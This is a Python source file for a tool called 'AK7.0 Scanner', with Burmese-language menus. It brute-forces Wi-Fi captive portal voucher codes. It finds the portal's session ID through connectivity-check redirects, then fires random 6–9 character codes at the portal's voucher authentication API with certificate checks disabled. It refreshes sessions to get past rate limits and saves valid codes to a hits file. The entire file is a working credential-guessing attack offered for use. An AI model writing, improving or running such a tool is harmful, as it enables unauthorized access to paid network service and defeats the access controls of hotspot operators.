import os
import time
import json
import random
import string
import sqlite3
import re
import html
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "scanner_data.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"

# ═══════════════════════════════════════════════════════════════
# ⚡ SPEED & RECOVERY SETTINGS
# ═══════════════════════════════════════════════════════════════
BASE_SLEEP_MIN = 0.02
BASE_SLEEP_MAX = 0.05
RATE_LIMIT_SLEEP = 20
NETWORK_RETRY_SLEEP = 2.0
SESSION_REFRESH_SLEEP = 1.0
MAX_NET_ERROR_STREAK = 5

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})

adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
session.mount("http://", adapter)
session.mount("https://", adapter)

# ═══════════════════════════════════════════════════════════════
# ❤️ AK7.0 HEART ASCII ART LOGO
# ═══════════════════════════════════════════════════════════════
AK7_LOGO = r"""
          .::.              .::.
        .::::::.          .::::::.
       ::::::::::          ::::::::::
       ::::::::::          ::::::::::
       ::::::::::          ::::::::::
        ::::::::            ::::::::
         ::::::              ::::::
          ::::                ::::
           ::                  ::
            .                  .
              ❤️ AK7.0 SCANNER ❤️
"""


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"


def now_str():
    return time.strftime("%H:%M:%S")


def normalize_hits(hits):
    if not hits:
        return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result


def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]


def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception:
        return None


def is_tried(conn, code):
    if conn is None:
        return False
    try:
        return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception:
        return False


def mark_tried(conn, code):
    if conn is None:
        return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception:
        pass


def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return None


def save_state(mode, tested, hits, portal_base=None, session_id=None):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({
                "mode": mode,
                "tested": tested,
                "hits": hits,
                "portal_base": portal_base,
                "session_id": session_id,
            }, f)
    except Exception:
        pass


def clear_state():
    try:
        os.remove(STATE_FILE)
    except Exception:
        pass


def extract_session(value):
    if not value:
        return None
    try:
        value = html.unescape(value)
    except Exception:
        pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v:
                return v[0]
    except Exception:
        pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception:
        return None


def normalize_portal_url(raw):
    """URL ကို portal base အဖြစ် ပြောင်းသည် (scheme + netloc)"""
    if not raw:
        return None
    raw = raw.strip()
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    try:
        p = urlparse(raw)
        if not p.netloc:
            return None
        return f"{p.scheme}://{p.netloc}"
    except Exception:
        return None


def fetch_session():
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=3, allow_redirects=True, verify=False)
        except Exception:
            continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                continue
            portal_base = f"{p.scheme}://{p.netloc}"

            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)

            for c in cands:
                sid = extract_session(c)
                if sid:
                    return portal_base, sid

            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=3, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid:
                        return portal_base, sid
            except Exception:
                pass
        except Exception:
            continue
    return None, None


def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=3, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception:
        return "__NETWORK_ERROR__"


def gen_code(mode, length):
    try:
        if mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        if mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        if mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception:
        pass
    return ""


def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs,
                speed=0.0, current_time="--:--:--", portal_url="(auto)"):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=4),
        Layout(name="live", size=4),
        Layout(name="console_logs", ratio=2),
        Layout(name="hits", ratio=2),
    )

    title = Text("🃏 AK7.0 SCANNER 🃏", style="bold magenta", justify="center")
    sub = Text("⚡ Auto-Recovery + URL Input Mode ⚡", style="bold yellow", justify="center")

    layout["header"].update(Panel(
        Align.center(Text.assemble(title, "\n", sub)),
        title="❤️❤️❤️",
        border_style="bold red",
        box=ROUNDED
    ))

    if status == "Active":
        s_disp = Text("Active", style="bold green", justify="center")
    elif status == "Limit":
        s_disp = Text("Limit", style="bold red", justify="center")
    else:
        s_disp = Text("--", style="bold yellow", justify="center")

    code_text = Text.assemble(
        Text(current_code if current_code else "----", style="bold green"),
        "\n",
        Text(f"🕐 {current_time}", style="dim cyan"),
    )

    live_grid = Table.grid(padding=0, expand=True)
    live_grid.add_column(ratio=3)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_row(
        Panel(Align.center(code_text), title="🔍 Code", border_style="bold red", box=ROUNDED),
        Panel(Align.center(Text(elapsed, style="bold cyan")), title="⏱ Time", border_style="bold red", box=ROUNDED),
        Panel(Align.center(Text(f"{tested:,}", style="bold yellow")), title="📊 Tested", border_style="bold red", box=ROUNDED),
        Panel(Align.center(Text(f"{speed:,.0f}/s", style="bold blue")), title="⚡ Speed", border_style="bold red", box=ROUNDED),
        Panel(Align.center(s_disp), title="Status", border_style="bold red", box=ROUNDED),
    )
    layout["live"].update(live_grid)

    log_table = Table(show_header=False, expand=True, box=None, padding=0)
    log_table.add_column("Logs")
    for lg in running_logs[-7:]:
        log_table.add_row(lg)
    if not running_logs:
        log_table.add_row("[dim]Waiting for codes...[/dim]")

    layout["console_logs"].update(Panel(
        log_table, title=f"💻 Live Logs  •  🌐 {portal_url}",
        border_style="bold red", box=ROUNDED
    ))

    hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
    hits_table.add_column("No.", width=5, justify="center")
    hits_table.add_column("Valid Code")
    hits_table.add_column("Time", width=12, justify="center")

    last_hits = hits[-10:]
    for i, h in enumerate(last_hits, 1):
        if isinstance(h, dict):
            c = h.get("code", "")
            t = h.get("time", "--:--:--")
        else:
            c = h
            t = "--:--:--"
        hits_table.add_row(str(i), f"[bold green]{c}[/bold green]", f"[dim cyan]🕐 {t}[/dim cyan]")

    if not last_hits:
        hits_table.add_row("", "[dim]No hits yet...[/dim]", "")

    hits_title = f"🎯 Hits ({len(hits)})"
    if len(hits) > 10:
        hits_title += " — showing last 10"

    layout["hits"].update(Panel(
        hits_table, title=hits_title,
        border_style="bold red", box=ROUNDED
    ))
    return layout


def scan_loop(mode, length, start_tested=0, start_hits=None,
              manual_portal=None, manual_session=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()} {length}"

    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()

    portal_base = manual_portal
    session_id = manual_session

    net_error_streak = 0
    last_speed_check = time.time()
    last_speed_tested = tested
    current_speed = 0.0
    current_code = "----"
    current_time = "--:--:--"

    conn = init_db()

    live = None
    live_cm = None
    try:
        initial = make_layout(mode_name, "----", tested, "00:00:00", "--", hits,
                              running_logs, 0.0, "--:--:--",
                              portal_url=portal_base or "(auto)")
        live_cm = Live(initial, refresh_per_second=8, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status):
        nonlocal current_speed, current_code, current_time
        current_code = code
        current_time = now_str()
        if live is None:
            return
        try:
            live.update(make_layout(mode_name, code, tested,
                                    format_time(time.time() - start_time), status,
                                    hits, running_logs, current_speed, current_time,
                                    portal_url=portal_base or "(auto)"))
        except Exception:
            pass

    def push_log(msg):
        t_str = now_str()
        running_logs.append(f"[dim]{t_str}[/dim] {msg}")

    try:
        push_log("AK7.0 URL Input Mode. ရပ်မသွားအောင် စောင့်ကြည့်နေသည်...")
        if portal_base:
            push_log(f"[green]🌐 Portal: {portal_base}[/green]")

        while True:
            try:
                # ── Session/Portal မရှိလျှင် ရယူ ──
                if not session_id or not portal_base:
                    _update("----", "Wait")

                    if manual_portal and manual_session:
                        portal_base, session_id = manual_portal, manual_session
                        push_log("[green]✅ သိမ်းထားသော URL/Session ကို ပြန်သုံးနေသည်။[/green]")
                        net_error_streak = 0
                    else:
                        # Manual URL ရှိသော်လည်း session မရှိ → auto ရှာ
                        portal_base, session_id = fetch_session()

                    if not session_id:
                        push_log("[yellow]⚠️ Session မရသေးပါ။ Portal URL ထည့်ပေးပါ သို့မဟုတ် ပြန်ကြိုးစားနေသည်...[/yellow]")
                        time.sleep(SESSION_REFRESH_SLEEP)
                        continue

                    push_log("[green]✅ Session ရပါပြီ။[/green]")
                    net_error_streak = 0
                    save_state(mode_str, tested, hits, portal_base, session_id)

                # ── Speed ချိန် ──
                now = time.time()
                if now - last_speed_check >= 1.0:
                    elapsed_diff = now - last_speed_check
                    tested_diff = tested - last_speed_tested
                    current_speed = tested_diff / elapsed_diff if elapsed_diff > 0 else 0
                    last_speed_check = now
                    last_speed_tested = tested

                code = gen_code(mode, length)
                if not code:
                    continue
                if is_tried(conn, code):
                    continue

                mark_tried(conn, code)
                tested += 1
                save_state(mode_str, tested, hits, portal_base, session_id)

                t_stamp = now_str()
                push_log(f"Testing code: [bold yellow]{code}[/bold yellow] [dim cyan]🕐 {t_stamp}[/dim cyan]")
                _update(code, "Active")

                res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                # ── Network Error ──
                if res == "__NETWORK_ERROR__" or res == "":
                    net_error_streak += 1
                    push_log(f"[red]⚠️ Network Error ({net_error_streak}/{MAX_NET_ERROR_STREAK})[/red]")
                    if net_error_streak >= MAX_NET_ERROR_STREAK:
                        push_log("[bold red]🔴 ကွန်ရက် အဆက်ပြတ်သွားသည်။ Session အသစ် ယူနေသည်...[/bold red]")
                        session_id = None
                        portal_base = None
                        net_error_streak = 0
                        time.sleep(NETWORK_RETRY_SLEEP)
                    else:
                        time.sleep(0.5)
                    continue

                net_error_streak = 0

                # ── Rate Limit ──
                if ("request limited" in low or "blocked" in low
                        or "too many" in low or '"limit"' in low
                        or "rate limit" in low):
                    _update(code, "Limit")
                    push_log(f"[bold red]🛑 Rate Limit ကျသည်! {RATE_LIMIT_SLEEP}s နားမည်...[/bold red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    portal_base = None
                    continue

                # ── Session Timeout ──
                if ("session timed out" in low or "session timeout" in low
                        or '"session":null' in low or "invalid session" in low):
                    push_log("[yellow]🔄 Session သက်တမ်းကုန်သွားသည်။ အသစ်ယူမည်...[/yellow]")
                    session_id = None
                    # Manual URL ရှိလျှင် portal_base ကို ချန်ထားပါ
                    if not manual_portal:
                        portal_base = None
                    time.sleep(1.0)
                    continue

                # ── Success ──
                if '"success":true' in low or '"authresult":"1"' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        hit_time = now_str()
                        hits.append({"code": code, "time": hit_time})
                        push_log(f"[bold green]🎉 SUCCESS! Valid Code: {code}[/bold green] [dim cyan]🕐 {hit_time}[/dim cyan]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{hit_time}] CODE: {code}\n")
                        except Exception:
                            pass
                        save_state(mode_str, tested, hits, portal_base, session_id)
                    _update(code, "Active")
                    continue

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))

            except KeyboardInterrupt:
                raise
            except Exception as e:
                push_log(f"[red]⚠️ Error: {str(e)[:50]} — ဆက်လုပ်နေသည်...[/red]")
                time.sleep(NETWORK_RETRY_SLEEP)
                continue

    finally:
        if live_cm is not None:
            try:
                live_cm.__exit__(None, None, None)
            except Exception:
                pass


def show_banner():
    clear_screen()
    try:
        console.print(Panel(
            Align.center(Text(AK7_LOGO, style="bold red")),
            title="[bold red]❤️ 🃏 AK7.0 SCANNER 🃏 ❤️[/bold red]",
            border_style="bold red", box=ROUNDED,
        ))
        console.print()
        console.print(Panel(
            Align.center(Text("❤️ AUTO-RECOVERY + URL INPUT MODE ❤️", style="bold yellow")),
            border_style="bold red", box=ROUNDED,
        ))
        console.print()
    except Exception:
        pass


def ask_mode():
    while True:
        show_banner()
        try:
            menu = Text()
            menu.append("  ╔═══════════════════════════════════════╗\n", style="bold red")
            menu.append("  ║   [1] 🔢 NUM ➜ ဂဏန်းသက်သက် (0-9)      ║\n", style="bold cyan")
            menu.append("  ║   [2] 🔤 ENG ➜ အင်္ဂလိပ်အက္ခရာ (a-z)   ║\n", style="bold cyan")
            menu.append("  ║   [3] 🔀 MIX ➜ အင်္ဂလိပ် + ဂဏန်း (a-z0-9)║\n", style="bold cyan")
            menu.append("  ║   [0] 🚪 BACK ➜ ထွက်ရန်               ║\n", style="bold red")
            menu.append("  ╚═══════════════════════════════════════╝\n", style="bold red")

            console.print(Panel(menu, title="❤️ Mode ရွေးပါ ❤️", border_style="bold red", box=ROUNDED))
            choice = Prompt.ask("[bold cyan]➜ ရွေးချယ်ပါ[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if choice == "0":
            return None
        if choice not in ("1", "2", "3"):
            try:
                console.print("[bold red]❌ မှားရွေးမိပါတယ်။ Option အမှန်ကို ရွေးပါ။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return {"1": "num", "2": "eng", "3": "mix"}[choice]


def ask_length(mode):
    while True:
        clear_screen()
        try:
            console.print(Panel(
                Align.center(Text(f"🎯 Mode: {mode.upper()}", style="bold magenta")),
                border_style="bold red", box=ROUNDED, title="❤️ ဂဏန်းရွေးချယ်ရန် ❤️"
            ))
            console.print()

            menu = Text()
            menu.append("  ╔══════════════════════════╗\n", style="bold red")
            menu.append("  ║   ၆ လုံး  ➜  [6] ကိုနှိပ်ပါ   ║\n", style="bold cyan")
            menu.append("  ║   ၇ လုံး  ➜  [7] ကိုနှိပ်ပါ   ║\n", style="bold cyan")
            menu.append("  ║   ၈ လုံး  ➜  [8] ကိုနှိပ်ပါ   ║\n", style="bold cyan")
            menu.append("  ║   ၉ လုံး  ➜  [9] ကိုနှိပ်ပါ   ║\n", style="bold cyan")
            menu.append("  ║   ထွက်ရန် ➜  [0] ကိုနှိပ်ပါ   ║\n", style="bold red")
            menu.append("  ╚══════════════════════════╝\n", style="bold red")

            console.print(Panel(menu, title="❤️ အရှည် ရွေးပါ ❤️", border_style="bold red", box=ROUNDED))
            console.print()
            console.print(Align.center(Text("💡 ကုဒ်အရေအတွက် များလေ အချိန်ကြာလေ", style="dim italic")))
            length = Prompt.ask("[bold cyan]➜ အရှည်[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if length == "0":
            return None
        if length not in ("6", "7", "8", "9"):
            try:
                console.print("[bold red]❌ မှားရွေးမိပါတယ်။ Option အမှန်ကို ရွေးပါ။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return int(length)


def ask_portal_url():
    """Portal URL ကို ကိုယ်တိုင်ထည့်မလား၊ auto ရှာမလား မေးသည်"""
    clear_screen()
    try:
        console.print(Panel(
            Align.center(Text("🌐 Portal URL Setup", style="bold magenta")),
            border_style="bold red", box=ROUNDED, title="❤️ URL ထည့်သွင်းရန် ❤️"
        ))
        console.print()
        console.print(Align.center(Text(
            "💡 ဥပမာ: http://10.10.10.1:8080\n"
            "💡 သို့မဟုတ် session ပါသော URL: http://10.10.10.1/?sessionId=abc123",
            style="dim italic")))
        console.print()

        if not Confirm.ask("[bold yellow]➜ Portal URL ကို ကိုယ်တိုင်ထည့်မလား?[/bold yellow]", default=False):
            return None, None

        raw = Prompt.ask("[bold cyan]➜ Portal URL[/bold cyan]").strip()
        if not raw:
            return None, None

        portal_base = normalize_portal_url(raw)
        if not portal_base:
            console.print("[bold red]❌ URL မမှန်ကန်ပါ။[/bold red]")
            time.sleep(1.5)
            return None, None

        sid = extract_session(raw)
        if not sid:
            sid = Prompt.ask("[bold cyan]➜ Session ID (မရှိလျှင် Enter)[/bold cyan]").strip() or None

        console.print()
        info = Text()
        info.append("  🌐 Portal  : ", style="cyan")
        info.append(f"{portal_base}\n", style="bold white")
        info.append("  🔑 Session : ", style="cyan")
        info.append(f"{sid or '(auto ရှာမည်)'}\n", style="bold white")
        console.print(Panel(info, title="❤️ အတည်ပြုပါ ❤️", border_style="bold red", box=ROUNDED))
        console.print()

        if not Confirm.ask("[bold yellow]➜ ဒီအတိုင်း ဆက်မလား? (y/n)[/bold yellow]", default=True):
            return None, None

        return portal_base, sid
    except KeyboardInterrupt:
        raise
    except Exception:
        return None, None


def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            saved_portal = state.get("portal_base")
            saved_session = state.get("session_id")

            clear_screen()
            console.print(Panel(
                Align.center(Text("💾  ရှာလက်စ အခြေအနေ တွေ့ပါတယ်", style="bold yellow")),
                border_style="bold red", box=ROUNDED, title="❤️ သတိပေးချက် ❤️"
            ))
            console.print()

            info = Text()
            info.append("  🎯 Mode    : ", style="cyan")
            info.append(f"{m.upper()} {l}\n", style="bold white")
            info.append("  📊 Tested  : ", style="cyan")
            info.append(f"{tested:,}\n", style="bold white")
            info.append("  🎁 Hits    : ", style="cyan")
            info.append(f"{len(hits)}\n", style="bold green")
            info.append("  🌐 URL     : ", style="cyan")
            info.append(f"{saved_portal or '(auto)'}\n", style="bold white")
            console.print(Panel(info, title="❤️ လက်ရှိ အခြေအနေ ❤️", border_style="bold red", box=ROUNDED))
            console.print()

            if Confirm.ask("[bold yellow]➜ ဒီအတိုင်း ဆက်ရှာမလား? (y/n)[/bold yellow]", default=True):
                scan_loop(m, int(l), start_tested=tested, start_hits=hits,
                          manual_portal=saved_portal, manual_session=saved_session)
                return
            else:
                clear_state()
        except KeyboardInterrupt:
            raise
        except Exception:
            clear_state()

    while True:
        mode = ask_mode()
        if mode is None:
            return

        length = ask_length(mode)
        if length is None:
            continue

        portal_base, session_id = ask_portal_url()

        scan_loop(mode, length, manual_portal=portal_base, manual_session=session_id)
        return


def main():
    try:
        run()
    except KeyboardInterrupt:
        pass
    except BaseException:
        pass
    finally:
        try:
            clear_screen()
        except BaseException:
            pass
        try:
            bye = Text()
            bye.append("\n\n")
            bye.append("❤️  AK7.0 out. Saw shi lar.  ❤️", style="bold red")
            bye.append("\n\n")
            console.print(Align.center(bye))
            time.sleep(2)
        except BaseException:
            try:
                print("\n\n❤️  AK7.0 out. Saw shi lar.  ❤️")
            except BaseException:
                pass


if __name__ == "__main__":
    main()